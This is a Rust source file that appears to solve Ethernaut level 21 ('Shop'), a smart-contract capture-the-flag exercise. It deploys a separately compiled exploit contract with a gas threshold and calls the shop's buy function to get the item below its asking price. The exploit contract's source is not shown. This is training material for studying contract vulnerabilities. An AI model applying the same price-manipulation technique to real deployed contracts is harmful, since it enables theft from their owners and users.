//! Ethernaut 21 — Shop.
//!
//! Goal: Buy the item from `Shop` for less than its initial asking price of
//! 100.
//!
//! https://github.com/OpenZeppelin/ethernaut/blob/d05643a/contracts/src/levels/Shop.sol

use async_trait::async_trait;
use ctf::Actor;
use ctf::ethereum::ethernaut::lvl21_shop::*;

pub struct Exploit;

alloy::sol!(
    #[sol(rpc)]
    ShopExploit,
    "out/ShopExploit.sol/ShopExploit.json"
);

#[async_trait]
impl ctf::Exploit for Exploit {
    type Target = Target;

    async fn attack(
        self,
        target: &Self::Target,
        offender: &Actor,
    ) -> eyre::Result<()> {
        let threshold = 0xf914;
        let exploit =
            ShopExploit::deploy(offender.provider(), threshold).await?;

        exploit
            .buy(target.address)
            .gas(1_000_000)
            .send()
            .await?
            .watch()
            .await?;

        Ok(())
    }
}
